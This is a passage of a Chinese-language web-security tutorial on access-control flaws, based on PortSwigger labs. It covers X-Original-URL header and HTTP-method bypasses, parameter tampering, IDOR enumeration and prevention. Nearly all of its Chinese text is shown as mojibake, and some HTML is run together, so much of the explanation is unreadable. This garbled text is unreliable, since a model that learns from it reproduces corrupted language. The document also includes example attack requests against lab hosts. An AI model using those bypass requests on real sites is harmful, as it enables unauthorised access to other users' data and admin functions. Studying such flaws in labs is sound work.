æ–‡ä»¶ï¼š<code>https://insecure-website.com/robots.txt</code> å¦‚æœ URLæ²¡æœ‰åœ¨ä»»ä½•åœ°æ–¹éƒ½æ²¡æœ‰æ³„éœ²ï¼Œæ”»å‡»è€…è¿˜å¯ä»¥è·‘å­—å…¸æ¥æš´åŠ›ç ´è§£æ•æ„ŸåŠŸèƒ½ç‚¹çš„ä½ç½®ã€‚</p><p><ahref="https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality">LAB:Unprotected admin functionality</a></p><h2 id="parameter-based-access-control-methods">Parameter-based accesscontrol methods</h2><p>æŸäº›åº”ç”¨ç¨‹åºåœ¨ç™»å½•æ—¶ç¡®å®šç”¨æˆ·çš„è®¿é—®æƒé™æˆ–è§’è‰²ï¼Œç„¶åå°†æ­¤ä¿¡æ¯å­˜å‚¨åœ¨ç”¨æˆ·å¯æ§åˆ¶çš„ä½ç½®ï¼Œä¾‹å¦‚éšè—å­—æ®µï¼Œcookieæˆ–é¢„è®¾æŸ¥è¯¢å­—ç¬¦ä¸²å‚æ•°ã€‚ åº”ç”¨ç¨‹åºæ ¹æ®æäº¤çš„å€¼åšå‡ºåç»­çš„è®¿é—®æ§åˆ¶å†³ç­–ã€‚ä¾‹å¦‚ï¼š<code>https://insecure-website.com/login/home.jsp?admin=true</code><code>https://insecure-website.com/login/home.jsp?role=1</code></p><p>è¿™ç§æ–¹æ³•ä»æ ¹æœ¬ä¸Šæ¥è¯´æ˜¯ä¸å®‰å…¨çš„ï¼Œå› ä¸ºç”¨æˆ·å¯ä»¥ç®€å•åœ°ä¿®æ”¹å€¼ï¼Œç„¶åå°±è·å¾—å¯¹æœªç»æˆæƒçš„åŠŸèƒ½ï¼ˆä¾‹å¦‚ç®¡ç†åŠŸèƒ½ï¼‰çš„è®¿é—®æƒé™ã€‚</p><p><ahref="https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter">LABï¼šUserrole controlled by request parameter</a></p><p><ahref="https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile">LABï¼šUserrole can be modified in user profile</a></p><h2id="broken-access-control-resulting-from-platform-misconfiguration">Brokenaccess control resulting from platform misconfiguration</h2><p>æŸäº›åº”ç”¨ç¨‹åºé€šè¿‡åŸºäºç”¨æˆ·è§’è‰²é™åˆ¶å¯¹ç‰¹å®š URL å’Œ HTTPæ–¹æ³•çš„è®¿é—®æ¥åœ¨å¹³å°å±‚å®æ–½è®¿é—®æ§åˆ¶ã€‚ä¾‹å¦‚ï¼šä¸€ä¸ªåº”ç”¨ç¨‹åºå¯èƒ½é…ç½®å¦‚ä¸‹è§„åˆ™ï¼š</p><blockquote><p>DENY: POST, /admin/deleteUser, managers</p></blockquote><p>è¯¥è§„åˆ™æ‹’ç» managers ç»„ä¸­çš„ç”¨æˆ·é€šè¿‡ POST è¯·æ±‚è®¿é—®URLï¼š<code>/ admin / deleteUser</code>ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¾ˆå¤šäº‹æƒ…éƒ½å¯èƒ½ä¼šå‡ºé”™ï¼Œä»è€Œå¯¼è‡´è®¿é—®æ§åˆ¶è¢«ç»•è¿‡ã€‚</p><p>ä¸€äº›åº”ç”¨ç¨‹åºæ¡†æ¶æ”¯æŒå„ç§éæ ‡å‡† HTTP å¤´ï¼Œå®ƒä»¬å¯ç”¨äºè¦†ç›–åŸå§‹è¯·æ±‚ä¸­çš„URLï¼Œä¾‹å¦‚ X-Original-URL å’Œ X-Rewrite-URLã€‚å¦‚æœä¸€ä¸ªç½‘ç«™ä½¿ç”¨ä¸¥æ ¼çš„å‰ç«¯æ§ä»¶æ¥é™åˆ¶åŸºäº URLçš„è®¿é—®ï¼Œä½†æ˜¯åº”ç”¨ç¨‹åºå…è®¸é€šè¿‡ä¸€ä¸ªè¯·æ±‚å¤´è¦†ç›–URLï¼Œåˆ™å®ƒå¯èƒ½å¯ä»¥ä½¿ç”¨å¦‚ä¸‹è¯·æ±‚æ¥ç»•è¿‡è®¿é—®æ§åˆ¶ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">X-Original-URL</span><span class="punctuation">: </span>/admin/deleteUser</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><ahref="https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented">LAB:URL-based access control can be circumvented</a></p><blockquote><p>æ³¨ï¼šX-Original-URL å†™ç›¸å¯¹ URLï¼ˆç›¸å¯¹ URL ä» / å¼€å§‹ï¼Œè¡¨ç¤ºå½“å‰ URLçš„æ ¹ç›®å½•ï¼‰ï¼Œ GET é‚£é‡Œå†™å‚æ•° GET æ–¹æ³•æŒ‡å®šåœ¨æäº¤è¡¨å•æ—¶å°†å‚æ•°å€¼è¿½åŠ åˆ° URLè¯·æ±‚ä¸Šã€‚</p></blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?username=carlos</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>acf61fbd1f0575ac80b2daf200190016.web-security-academy.net</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=sw017My5iPscUyAzDeCUJEFJiDbuqiom</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-Original-URL</span><span class="punctuation">: </span>/admin/delete</span><br></pre></td></tr></table></figure><p>ä¸è¯·æ±‚ä¸­ä½¿ç”¨çš„ HTTP æ–¹æ³•æœ‰å…³çš„å…¶ä»–æ”»å‡»ä¹Ÿå¯èƒ½ä¼šäº§ç”Ÿã€‚ä¸Šé¢çš„å‰ç«¯æ§ä»¶åŸºäº URL å’Œ HTTP æ–¹æ³•é™åˆ¶è®¿é—®ã€‚æŸäº›ç½‘ç«™åœ¨æ‰§è¡Œæ“ä½œæ—¶å¯ä»¥ä½¿ç”¨å…¶ä»– HTTP è¯·æ±‚æ–¹æ³•ã€‚ å¦‚æœæ”»å‡»è€…å¯ä»¥ä½¿ç”¨GETï¼ˆæˆ–å…¶ä»–ï¼‰æ–¹æ³•å¯¹å—é™åˆ¶çš„ URLæ‰§è¡Œæ“ä½œï¼Œåˆ™ä»–ä»¬å¯ä»¥è§„é¿åœ¨å¹³å°å±‚å®ç°çš„è®¿é—®æ§åˆ¶ã€‚</p><p><ahref="https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented">LAB:Method-based access control can be circumvented</a></p><h1 id="horizontal-privilege-escalation">Horizontal privilegeescalation</h1><p>å½“ç”¨æˆ·èƒ½å¤Ÿè®¿é—®å±äºå…¶ä»–ç”¨æˆ·çš„åŒç§ç±»å‹èµ„æºï¼Œè€Œä¸æ˜¯ä»–ä»¬è‡ªå·±çš„æ—¶ï¼Œå°±å‡ºç°äº†æ°´å¹³è¶Šæƒã€‚ä¾‹å¦‚ï¼šå¦‚æœä¸€ä¸ªå‘˜å·¥åªåº”è¯¥èƒ½å¤Ÿè®¿é—®è‡ªå·±çš„å·¥ä½œå’Œå·¥èµ„è®°å½•ï¼Œä½†å®é™…ä¸Šä¹Ÿå¯ä»¥è®¿é—®å…¶ä»–å‘˜å·¥çš„è®°å½•ï¼Œé‚£ä¹ˆè¿™å°±æ˜¯æ°´å¹³è¶Šæƒã€‚</p><h2 id="classification">Classification</h2><p>å…¶å®å…³äºæ°´å¹³è¶Šæƒçš„åˆ†ç±»ï¼Œæ²¡å•¥æ ‡å‡†ï¼Œè¿™é‡Œä¸ºå•¥è¦æä¸€ä¸‹å‘¢ï¼Œä¸»è¦æ˜¯ä¾¿äºå¤§å®¶å¯¹è¶Šæƒå‘ç”Ÿçš„å…·ä½“åœºæ™¯æœ‰ä¸€ä¸ªæ›´åŠ å½¢è±¡å…·ä½“çš„äº†è§£ã€‚æœ¬æ–‡è®²çš„æ—¶å€™ï¼Œå°±ä¸åˆ»æ„åŒºåˆ†äº†ã€‚</p><p>æ ¹æ®å¯¹æ•°æ®çš„æ“ä½œåˆ†ç±»</p><ol type="1"><li>è¶Šæƒå¢åŠ ï¼ˆå¢ï¼‰</li><li>è¶Šæƒåˆ é™¤ï¼ˆåˆ ï¼‰</li><li>è¶Šæƒä¿®æ”¹ï¼ˆæ”¹ï¼‰</li><li>è¶ŠæƒæŸ¥çœ‹ï¼ˆæŸ¥ï¼‰</li></ol><p>ä¸Šé¢æˆ‘ä»¬è®²åˆ°æ°´å¹³æƒé™æ§åˆ¶æ˜¯åŸºäºæ•°æ®çš„è®¿é—®æ§åˆ¶ï¼Œè€Œå¯¹äºæ•°æ®æ¥è¯´ï¼Œå°±æœ‰ï¼šå¢ã€åˆ ã€æ”¹ã€æŸ¥å››ç§æ“ä½œæ–¹å¼ï¼Œå› è€Œè¶Šæƒæ¼æ´çš„æˆå› ä¹Ÿä¸»è¦æ˜¯å› ä¸ºå¼€å‘äººå‘˜åœ¨å¯¹æ•°æ®è¿›è¡Œå¢ã€åˆ ã€æ”¹ã€æŸ¥è¯¢æ—¶ï¼Œå¯¹å®¢æˆ·ç«¯è¯·æ±‚çš„æ•°æ®è¿‡åˆ†ç›¸ä¿¡è€Œé—æ¼äº†æƒé™çš„åˆ¤å®šã€‚</p><p>æ ¹æ®æ•°æ®çš„å¯¹è±¡åˆ†ç±»</p><ol type="1"><li>åŸºäºç”¨æˆ·èº«ä»½ ID</li><li>åŸºäºå¯¹è±¡ ID</li><li>åŸºäºæ–‡ä»¶ ID</li></ol><h2 id="test-methods">Test Methods</h2><p>åŸºæœ¬ï¼šä¸¤ä¸ªè´¦æˆ·ï¼Œä¸¤ä¸ªæµè§ˆå™¨ï¼Œåˆ†åˆ«ç™»é™†ï¼ŒæŸ¥çœ‹å¯¹æ–¹ idæ ‡è¯†ï¼Œç„¶åæ”¹æˆå¯¹æ–¹çš„ï¼Œæµ‹è¯•ã€‚</p><h2 id="four-test-scenario">Four Test Scenario</h2><h3 id="id-ç›´æ¥å¯éå†">id ç›´æ¥å¯éå†</h3><p>åœºæ™¯ï¼š id ç›´æ¥å°±æ˜¯ç®€å•çš„æ•°å­— ä¸¾ä¾‹å­ï¼š</p><ol type="1"><li>ä½¿ç”¨ Burp çš„ intruder è¿›è¡Œéå†</li><li>è‡ªå·±å†™ py ç­‰è„šæœ¬éå†</li></ol><h4 id="local-lab">Local lab</h4><p>Webug å’Œ pikachu é¶åœºç»ƒä¹ </p><h4 id="online-lab">Online lab</h4><p>æ°´å¹³è¶Šæƒæ”»å‡»å¯èƒ½ä½¿ç”¨ä¸å‚ç›´è¶Šæƒç±»ä¼¼çš„åˆ©ç”¨æ–¹æ³•ã€‚ä¾‹å¦‚ï¼šç”¨æˆ·é€šå¸¸å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ç½‘å€æ¥è®¿é—®è‡ªå·±çš„å¸æˆ·é¡µé¢ï¼š<code>https://insecure-website.com/myaccount?id=123</code></p><p>ç°åœ¨ï¼Œå¦‚æœæ”»å‡»è€…å°† id å‚æ•°å€¼ä¿®æ”¹ä¸ºå¦ä¸€ä¸ªç”¨æˆ·çš„ IDå‚æ•°å€¼ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½ä¼šè®¿é—®å…·æœ‰ç›¸å…³æ•°æ®å’ŒåŠŸèƒ½çš„å¦ä¸€ä¸ªç”¨æˆ·çš„å¸æˆ·é¡µé¢ã€‚</p><p><ahref="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter">LAB:User ID controlled by request parameter</a></p><h4 id="cases">Cases</h4><p>è¶Šæƒåˆ é™¤ï¼š</p><p><ahref="http://www.onebug.org/wooyundata/6663.html">ç™¾åº¦åˆ›æ„ä¸“å®¶æŸåŠŸèƒ½å¹³è¡Œæƒé™æ¼æ´ï¼ˆå¯åˆ é™¤ä»–äººç´ æï¼‰</a></p><p><ahref="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0212974">åä½é…’åº—æŸå¤„è¶Šæƒåˆ é™¤ä¿®æ”¹ç”¨æˆ·ä¿¡æ¯</a></p><p><ahref="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-036411">æœç‹ç™½ç¤¾ä¼šä»»æ„ç”¨æˆ·ä¿¡æ¯ä¿®æ”¹æ¼æ´</a></p><p>å¥—è·¯ï¼š</p><ol type="1"><li>æŸ¥çœ‹è‡ªå·±çš„åˆ é™¤è¯·æ±‚ï¼Œå‘ç°æ ‡è¯†è‡ªå·±çš„ id å‚æ•° --&gt;å¯»æ‰¾åŠŸèƒ½ç‚¹çš„è¯·æ±‚åŒ…ï¼Œ å‘ç°ç”¨æˆ·æ ‡è¯†</li><li>å¯»æ‰¾åˆ«äººçš„ id å‚æ•°ï¼Œç„¶åæ‹¿è¿‡æ¥ï¼Œæ›¿æ¢åˆ°åˆ é™¤çš„è¯·æ±‚åŒ…ä¸­ï¼Œé‡æ”¾åŒ… --&gt;æ›¿æ¢ä¸ºåˆ«äººçš„ç”¨æˆ·æ ‡è¯†ï¼Œé‡æ”¾åŠŸèƒ½ç‚¹çš„è¯·æ±‚åŒ…</li><li>è§‚å¯Ÿç»“æœ</li></ol><p>è¶ŠæƒæŸ¥çœ‹ã€ä¿®æ”¹ï¼š</p><p><ahref="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-033748">Likeå›¢ç”¨æˆ·ä¿¡æ¯æ³„éœ²+è¶Šæƒæ¼æ´ï¼ˆå¯è·å–å¤§é‡ç”¨æˆ·ä½å€è”ç³»ä¿¡æ¯ï¼‰</a></p><p>è¶Šæƒå¢åŠ ã€åˆ é™¤ã€ä¿®æ”¹ï¼š <ahref="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-033542">çˆ±æ‹è¶Šæƒæ¼æ´åŠè®¾è®¡ä¸åˆç†æ¼æ´å¤§ç¤¼åŒ…ï¼ˆå¦¹å­å“­äº†ï¼‰</a></p><h3 id="id-å¯é€†ç¼–ç ">id å¯é€†ç¼–ç </h3><p>ä¸¾ä¾‹</p><p>å¯¹äº payloadï¼Œ å…ˆç¼–ç ï¼Œå†éå†ã€‚</p><p>åœºæ™¯ï¼šid ç±»ä¼¼æŸç§ç¼–ç ï¼Œæ¯”å¦‚ï¼šbase64 ç¼–ç ï¼Œ ç®€å• md5ï¼ˆå¤æ‚çš„è§£ä¸å‡ºæ¥å‘€emmï¼‰ ç­‰ï¼ˆéœ€è¦æ‰‹åŠ¨å°è¯•è§£ç ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½è§£ç ï¼Œè§£å‡ºæ¥æ˜¯å•¥ï¼‰</p><p>æ–¹æ³•ï¼š</p><ol type="1"><li>ä½¿ç”¨ Burp çš„ intruder è¿›è¡Œç¼–ç ï¼Œéå†</li><li>è‡ªå·±å†™ py ç­‰è„šæœ¬éå†</li></ol><h3 id="id-å‰ç«¯-js-åŠ å¯†">id å‰ç«¯ JS åŠ å¯†</h3><p>åœºæ™¯ï¼šå‰ç«¯ JS åŠ å¯† idï¼Œæ¯”å¦‚ï¼šrasï¼Œaes åŠ å¯†ç­‰</p><p>æ–¹æ³•ï¼š æµè§ˆå™¨å¼€å‘è€…å·¥å…· JS æ–­ç‚¹è°ƒè¯•ï¼Œæ‰¾å‡ºåŠ å¯†å‰çš„å€¼ï¼Œè¿›è¡Œæ‰‹åŠ¨ä¿®æ”¹æ‰¾åˆ°åŠ å¯†æ–¹æ³•åï¼Œå¯ä»¥å†™è„šæœ¬éå†ã€‚</p><h3 id="id-ä¸å¯éå†">id ä¸å¯éå†</h3><h2 id="online-lab-1">Online Lab</h2><p>åœ¨æŸäº›åº”ç”¨ç¨‹åºä¸­ï¼Œå¯åˆ©ç”¨å‚æ•°çš„å€¼å¹¶ä¸å¯é¢„æµ‹ã€‚ä¾‹å¦‚ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨å…¨å±€å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆGUIDï¼‰æ¥æ ‡è¯†ç”¨æˆ·ï¼Œè€Œä¸æ˜¯é€’å¢æ•°å­—ã€‚åœ¨è¿™é‡Œï¼Œæ”»å‡»è€…å¯èƒ½æ— æ³•çŒœæµ‹æˆ–é¢„æµ‹å¦ä¸€ä¸ªç”¨æˆ·çš„æ ‡è¯†ç¬¦ã€‚ä½†æ˜¯ï¼Œå±äºå…¶ä»–ç”¨æˆ·çš„ GUIDå¯èƒ½ä¼šåœ¨å¼•ç”¨ç”¨æˆ·çš„åº”ç”¨ç¨‹åºçš„å…¶ä»–ä½ç½®æ³„éœ²ï¼Œä¾‹å¦‚ç”¨æˆ·æ¶ˆæ¯æˆ–è¯„è®ºã€‚</p><p><ahref="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids">LAB:User ID controlled by request parameter, with unpredictable userIDs</a></p><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œåº”ç”¨ç¨‹åºä¼šæ£€æµ‹åˆ°ä½•æ—¶ä¸å…è®¸ç”¨æˆ·è®¿é—®èµ„æºï¼Œå¹¶å°†å…¶é‡å®šå‘è¿”å›åˆ°ç™»å½•é¡µé¢ã€‚ä½†æ˜¯ï¼ŒåŒ…å«é‡å®šå‘çš„å“åº”å¯èƒ½ä»ç„¶åŒ…å«ä¸€äº›å±äºç›®æ ‡ç”¨æˆ·çš„æ•æ„Ÿæ•°æ®ï¼Œå› æ­¤æ”»å‡»ä»ç„¶æ˜¯æˆåŠŸã€‚</p><p><ahref="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect">LAB:User ID controlled by request parameter with data leakage inredirect</a></p><h2 id="real-bug-hunting">Real Bug Hunting</h2><h1 id="horizontal-to-vertical-privilege-escalation">Horizontal tovertical privilege escalation</h1><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œé€šè¿‡æ”»å‡»æƒé™è¾ƒé«˜çš„ç”¨æˆ·ï¼Œå¯ä»¥å°†æ°´å¹³è¶Šæƒè½¬å˜ä¸ºå‚ç›´è¶Šæƒã€‚ä¾‹å¦‚ï¼šæ°´å¹³è¶Šæƒå¯èƒ½å…è®¸æ”»å‡»è€…é‡ç½®æˆ–è·å–å±äºå¦ä¸€ä¸ªç”¨æˆ·çš„å¯†ç ã€‚å¦‚æœæ”»å‡»è€…ä»¥ç®¡ç†å‘˜ç”¨æˆ·ä¸ºç›®æ ‡å¹¶æ”»å‡»äº†ä»–ä»¬çš„å¸æˆ·ï¼Œé‚£ä»–ä»¬ä¾¿å¯ä»¥è·å¾—ç®¡ç†å‘˜æƒé™ï¼Œå› æ­¤å¯ä»¥è¿›è¡Œå‚ç›´è¶Šæƒã€‚</p><p>ä¾‹å¦‚ï¼Œæ”»å‡»è€…ä¹Ÿè®¸å¯ä»¥ä½¿ç”¨åœ¨å‰é¢é’ˆå¯¹æ°´å¹³è¶Šæƒå·²ç»è®²è¿°è¿‡çš„å‚æ•°ç¯¡æ”¹æŠ€æœ¯æ¥è®¿é—®å¦ä¸€ä¸ªç”¨æˆ·çš„å¸æˆ·é¡µé¢ï¼š</p><p><code>https://insecure-website.com/myaccount?id=456</code></p><p>å¦‚æœç›®æ ‡ç”¨æˆ·æ˜¯åº”ç”¨ç¨‹åºç®¡ç†å‘˜ï¼Œåˆ™æ”»å‡»è€…å°†è·å¾—å¯¹ç®¡ç†å¸æˆ·é¡µé¢çš„è®¿é—®æƒé™ã€‚æ­¤é¡µé¢å¯èƒ½æ³„éœ²ç®¡ç†å‘˜å¯†ç æˆ–æä¾›ä¿®æ”¹å¯†ç çš„æ‰‹æ®µï¼Œåˆæˆ–è€…å¯èƒ½æä¾›å¯¹ç‰¹æƒåŠŸèƒ½çš„ç›´æ¥è®¿é—®ã€‚</p><h1 id="insecure-direct-object-references">Insecure direct objectreferences</h1><p>ä¸å®‰å…¨çš„ç›´æ¥å¯¹è±¡å¼•ç”¨ï¼ˆIDORï¼‰æ˜¯è®¿é—®æ§åˆ¶æ¼æ´çš„ä¸€ä¸ªå­ç±»åˆ«ã€‚å½“åº”ç”¨ç¨‹åºä½¿ç”¨ç”¨æˆ·æä¾›çš„è¾“å…¥ç›´æ¥è®¿é—®å¯¹è±¡ï¼Œå¹¶ä¸”æ”»å‡»è€…å¯ä»¥ä¿®æ”¹è¾“å…¥ä»¥è·å¾—æœªç»æˆæƒçš„è®¿é—®æ—¶ï¼Œå°±ä¼šå‘ç”ŸIDORã€‚ å®ƒä»¥å…¶åœ¨ OWASP 2007 Top 10ä¸­çš„å‡ºç°è€Œå¾—åˆ°æ™®åŠï¼Œå°½ç®¡å®ƒåªæ˜¯è®¸å¤šå®ç°å‡ºé”™çš„ä¸€ä¸ªä¾‹å­ï¼Œè¯¥é”™è¯¯å¯èƒ½å¯¼è‡´è®¿é—®æ§åˆ¶è¢«è§„é¿ï¼Œä»è€Œå®ç°è¶Šæƒã€‚</p><p><ahref="https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references">LAB:Insecure direct object references</a></p><blockquote><p>Read more <ahref="https://portswigger.net/web-security/access-control/idor">Insecuredirect object references (IDOR)</a></p></blockquote><h1 id="access-control-vulnerabilities-in-multi-step-processes">Accesscontrol vulnerabilities in multi-step processes</h1><p>è®¸å¤šç½‘ç«™é€šè¿‡ä¸€ç³»åˆ—æ­¥éª¤æ¥å®ç°é‡è¦åŠŸèƒ½ã€‚å½“éœ€è¦è·å–å„ç§è¾“å…¥æˆ–é€‰é¡¹æ—¶ï¼Œæˆ–è€…å½“ç”¨æˆ·éœ€è¦åœ¨æ‰§è¡Œæ“ä½œä¹‹å‰æŸ¥çœ‹å¹¶ç¡®è®¤è¯¦ç»†ä¿¡æ¯æ—¶ï¼Œé€šå¸¸ä¼šè¿™æ ·åšã€‚ä¾‹å¦‚ï¼Œç”¨äºæ›´æ–°ç”¨æˆ·è¯¦ç»†ä¿¡æ¯çš„ç®¡ç†åŠŸèƒ½å¯èƒ½æ¶‰åŠä»¥ä¸‹æ­¥éª¤ï¼š</p><ol type="1"><li>åŠ è½½åŒ…å«ç‰¹å®šç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯çš„è¡¨å•ï¼›</li><li>æäº¤æ›´æ”¹ï¼›</li><li>æŸ¥çœ‹æ›´æ”¹å¹¶ç¡®è®¤ã€‚</li></ol><h2 id="procedure-based-access-control">Procedure-based accesscontrol</h2><p>æœ‰æ—¶ï¼Œç½‘ç«™ä¼šå¯¹å…¶ä¸­æŸäº›æ­¥éª¤å®æ–½ä¸¥æ ¼çš„è®¿é—®æ§åˆ¶ï¼Œè€Œå¿½ç•¥å…¶ä»–æ­¥éª¤ã€‚ä¾‹å¦‚ï¼Œå‡è®¾ç¬¬ä¸€æ­¥å’Œç¬¬äºŒæ­¥å·²ç»æ­£ç¡®å®è¡Œäº†è®¿é—®æ§åˆ¶ï¼Œä½†ç¬¬ä¸‰æ­¥å´æ²¡æœ‰ã€‚å®é™…ä¸Šï¼Œè¯¥ç½‘ç«™å‡å®šç”¨æˆ·åªæœ‰å®Œæˆäº†å…·æœ‰æ°å½“è®¿é—®æƒé™æ§åˆ¶çš„ç¬¬ä¸€æ­¥ä¹‹åï¼Œæ‰å¯ä»¥è¿›å…¥ç¬¬3 æ­¥ã€‚åœ¨è¿™é‡Œï¼Œæ”»å‡»è€…å¯ä»¥è·³è¿‡å‰ä¸¤ä¸ªæ­¥éª¤å¹¶ç›´æ¥ä½¿ç”¨æ‰€éœ€å‚æ•°æäº¤å¯¹ç¬¬ä¸‰æ­¥çš„è¯·æ±‚ï¼Œä»è€Œè·å¾—æœªç»æˆæƒçš„åŠŸèƒ½è®¿é—®ã€‚ï¼ˆå®é™…æµ‹è¯•æ—¶ï¼Œå¹¶ä¸çŸ¥é“è¿™æ ·ï¼Œéœ€è¦å…ˆè¿‡ä¸€éæ­¥éª¤ï¼Œè®°å½•æ¯ä¸€æ­¥çš„è¯·æ±‚åŒ…ï¼Œç„¶åè‡ªå·±æ ¹æ®æ•°æ®åŒ…ï¼ˆè¯·æ±‚ä»¥åŠç›¸åº”ï¼‰ä½œå‡ºå‡è®¾ï¼Œå¹¶è¿›è¡Œæµ‹è¯•éªŒè¯ï¼Œæ˜¯å¦å­˜åœ¨è¿™æ ·çš„æ¼æ´ã€‚ï¼‰</p><p><ahref="https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step">LAB:Multi-step process with no access control on one step</a></p><h2 id="referer-based-access-control">Referer-based access control</h2><p>æŸäº›ç½‘ç«™çš„è®¿é—®æ§åˆ¶åŸºäº HTTP è¯·æ±‚ä¸­æäº¤çš„ Referer å¤´ã€‚é€šå¸¸ï¼Œæµè§ˆå™¨ä¼šå°† Referer æ ‡å¤´æ·»åŠ åˆ°è¯·æ±‚ä¸­ï¼Œä»¥æŒ‡ç¤ºå‘èµ·è¯·æ±‚çš„é¡µé¢ã€‚</p><p>ä¾‹å¦‚ï¼Œå‡è®¾åº”ç”¨ç¨‹åºå¯¹<code>/admin</code>ä¸Šçš„ä¸»ç®¡ç†é¡µé¢å®æ–½äº†å¾ˆå¥½çš„è®¿é—®æ§åˆ¶ï¼Œä½†æ˜¯å¯¹äºå­é¡µé¢ï¼ˆä¾‹å¦‚<code>/admin/deleteUser</code>ï¼‰ä»…æ£€æŸ¥Referer æ ‡å¤´ã€‚ å¦‚æœ Referer å¤´åŒ…å«ä¸»è¦çš„ <code>/admin</code>URLï¼Œåˆ™å…è®¸è¯¥è¯·æ±‚ã€‚</p><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç”±äº Refererå¤´å¯ä»¥è¢«æ”»å‡»è€…å®Œå…¨æ§åˆ¶ï¼Œå› æ­¤ä»–ä»¬å¯ä»¥ç›´æ¥ä¼ªé€ å¯¹æ•æ„Ÿå­é¡µé¢çš„è¯·æ±‚ï¼Œæä¾›æ‰€éœ€çš„Referer å¤´ï¼Œä»è€Œè·å¾—æœªç»æˆæƒçš„è®¿é—®ã€‚</p><p><ahref="https://portswigger.net/web-security/access-control/lab-referer-based-access-control">LAB:Referer-based access control</a></p><h2 id="location-based-access-control">Location-based accesscontrol</h2><p>ä¸€äº›ç½‘ç«™æ ¹æ®ç”¨æˆ·çš„åœ°ç†ä½ç½®å¯¹èµ„æºå®æ–½è®¿é—®æ§åˆ¶ã€‚ä¾‹å¦‚ï¼Œè¿™å¯ä»¥é€‚ç”¨äºé‚£äº›æœ‰å›½å®¶æ³•å¾‹æˆ–ä¼ä¸šä¸šåŠ¡é™åˆ¶çš„é“¶è¡Œåº”ç”¨ç¨‹åºæˆ–åª’ä½“æœåŠ¡ç­‰ã€‚è¿™äº›è®¿é—®æ§åˆ¶é€šå¸¸å¯ä»¥é€šè¿‡ä½¿ç”¨ Web ä»£ç†ï¼ŒVPNæˆ–ä¿®æ”¹å®¢æˆ·ç«¯åœ°ç†å®šä½æœºåˆ¶æ¥è§„é¿ã€‚</p><h1 id="how-to-prevent-access-control-vulnerabilities">How to preventaccess control vulnerabilities</h1><p>é€šå¸¸ï¼Œå¯ä»¥é‡‡å– <ahref="https://www.forcepoint.com/cyber-edu/defense-depth">çºµæ·±é˜²å¾¡</a>æ–¹æ³•å¹¶åº”ç”¨ä»¥ä¸‹åŸåˆ™æ¥é˜²æ­¢è®¿é—®æ§åˆ¶æ¼æ´ï¼š</p><ul><li>ä¸è¦é€šè¿‡éšè—æ¥è¿›è¡Œè®¿é—®æ§åˆ¶ã€‚</li><li>é™¤éæ‰“ç®—å…¬å¼€è®¿é—®èµ„æºï¼Œå¦åˆ™é»˜è®¤æ‹’ç»è®¿é—®ã€‚</li><li>å°½å¯èƒ½ä½¿ç”¨å•ä¸ªåº”ç”¨ç¨‹åºèŒƒå›´çš„æœºåˆ¶æ¥æ‰§è¡Œè®¿é—®æ§åˆ¶ã€‚</li><li>åœ¨ä»£ç çº§åˆ«ï¼Œä½¿å¼€å‘äººå‘˜å¿…é¡»å£°æ˜æ¯ä¸ªèµ„æºå…è®¸çš„è®¿é—®æƒé™ï¼Œå¹¶é»˜è®¤æ‹’ç»è®¿é—®ã€‚</li><li>å½»åº•å®¡æ ¸å’Œæµ‹è¯•è®¿é—®æ§åˆ¶ï¼Œä»¥ç¡®ä¿å®ƒä»¬æŒ‰è®¾è®¡å·¥ä½œã€‚</li></ul><h1 id="å‚è€ƒä¸æ¨è">å‚è€ƒä¸æ¨è</h1><blockquote><ol 